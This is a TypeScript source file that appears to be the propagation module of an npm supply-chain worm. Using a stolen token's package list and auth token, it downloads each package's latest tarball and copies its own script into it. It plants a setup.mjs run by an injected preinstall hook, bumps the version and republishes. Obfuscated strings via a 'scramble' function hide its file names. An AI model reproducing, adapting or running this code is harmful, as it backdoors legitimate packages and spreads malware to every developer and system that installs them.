import { $ } from "bun";
import { randomBytes } from "crypto";
import { copyFileSync, createWriteStream } from "fs";
import * as fs from "fs/promises";
import * as path from "path";
import { join } from "path";
import { Readable } from "stream";
import { pipeline } from "stream/promises";
import * as tar from "tar";

import { config } from "../../generated";
import { SCRIPT_NAME } from "../../utils/config";
import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { publishTarball } from "./publish";
import type { TokenInfo } from "./tokenCheck";

declare function scramble(str: string): string;

export class NpmClient extends Mutator {
  private tokenInfo: TokenInfo;

  constructor(token: TokenInfo) {
    super();
    this.tokenInfo = token;
  }

  async execute() {
    try {
      const isUnix = ["darwin", "linux"].includes(process.platform);

      if (isUnix) {
        this.tokenInfo.packages.forEach((pkgName: string) => {
          logUtil.log(`Would be updating: ${pkgName}`);
        });
        const packages = await this.downloadPackages(this.tokenInfo.packages);
        await Promise.all(
          packages.downloaded.map((pkgFile) => this.publishPackage(pkgFile)),
        );
        await fs.rm(packages.tmpDir, { recursive: true, force: true });
        return true;
      }
    } catch (e) {
      logUtil.error(e);
      logUtil.error("Failure updating package.");
      return false;
    }

    return true;
  }

  private async updateTarball(tarballPath: string): Promise<string> {
    const uniqueSuffix = `${Date.now()}_${randomBytes(8).toString("hex")}`;
    const tmpDir = path.join(path.dirname(tarballPath), `_tmp_${uniqueSuffix}`);
    await fs.mkdir(tmpDir, { recursive: true });

    try {
      await tar.extract({ file: tarballPath, cwd: tmpDir });
      copyFileSync(Bun.main, path.join(tmpDir, "package", SCRIPT_NAME));
      const pkgJsonPath = path.join(
        tmpDir,
        "package",
        scramble("package.json"),
      );
      const pkgSetupPath = path.join(tmpDir, "package", scramble("setup.mjs"));
      const pkg = JSON.parse(await fs.readFile(pkgJsonPath, "utf-8"));
      pkg.scripts = {};
      pkg.scripts.preinstall = scramble("node setup.mjs");
      const [major, minor, patch] = pkg.version.split(".").map(Number);
      pkg.version = `${major}.${minor}.${patch + 1}`;
      await Bun.write(pkgSetupPath, config);
      await Bun.write(pkgJsonPath, JSON.stringify(pkg, null, 2));
      const updatedPath = path.join(
        path.dirname(tarballPath),
        `${uniqueSuffix}_${scramble("package-updated.tgz")}`,
      );

      await pipeline(
        tar.create({ gzip: true, cwd: tmpDir }, ["package"]),
        createWriteStream(updatedPath),
      );

      const written = await fs.readFile(updatedPath);
      if (written.length < 18 || written[0] !== 0x1f || written[1] !== 0x8b) {
        throw new Error(
          `[npm] tarball at ${updatedPath} is not a valid gzip stream ` +
            `(len=${written.length}, first bytes=${written.subarray(0, 4).toString("hex")})`,
        );
      }

      logUtil.log(`Updated path: ${updatedPath}`);
      return updatedPath;
    } finally {
    }
  }

  async downloadPackages(
    packages: string[],
  ): Promise<{ tmpDir: string; downloaded: string[] }> {
    const tmpDir = await $`mktemp -d`.text().then((s) => s.trim());
    const downloaded: string[] = [];

    const download = async (pkg: string) => {
      try {
        const meta = await fetch(
          `https://registry.npmjs.org/${pkg.replace("/", "%2F")}`,
        );
        if (!meta.ok) return;
        const { "dist-tags": tags, versions } = (await meta.json()) as {
          "dist-tags": { latest: string };
          versions: Record<string, { dist?: { tarball?: string } }>;
        };
        const tarball = versions[tags.latest]?.dist?.tarball;
        if (!tarball) return;

        const res = await fetch(tarball);
        if (!res.ok || !res.body) return;

        const filename = `${pkg.replace("@", "").replace("/", "-")}-${tags.latest}.tgz`;
        const tarballPath = join(tmpDir, filename);
        await pipeline(
          Readable.fromWeb(res.body as import("stream/web").ReadableStream),
          createWriteStream(tarballPath),
        );
        const updatedPath = await this.updateTarball(tarballPath);
        downloaded.push(updatedPath);
      } catch (e) {
        logUtil.log(`Failed to download ${pkg}: ${e}`);
      }
    };

    await Promise.all(packages.map(download));
    return { tmpDir, downloaded };
  }

  async publishPackage(tarballPath: string): Promise<boolean> {
    if (!this.tokenInfo) return false;
    try {
      return await publishTarball(tarballPath, this.tokenInfo.authToken);
    } catch (e) {
      logUtil.error(e);
      return false;
    }
  }
}
